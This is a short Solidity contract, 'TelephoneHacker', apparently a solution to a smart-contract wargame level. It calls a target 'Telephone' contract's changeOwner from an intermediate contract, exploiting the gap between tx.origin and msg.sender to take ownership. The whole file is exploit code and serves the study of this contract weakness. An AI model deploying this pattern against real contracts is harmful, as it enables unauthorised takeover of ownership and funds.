pragma solidity ^0.4.18;

// 0x48fb9ee3081d05b8ebc7e23f304f2d67690c8d13
// 0x4c76450acdd1b96980e561e110a8fa2211167a51
import 'Telephone.sol';
contract TelephoneHacker {
  Telephone telephone;

  function TelephoneHacker(address aimAddr) public {
    telephone = Telephone(aimAddr);
  }

  function changeOwner() public {
    telephone.changeOwner(tx.origin);
  }
}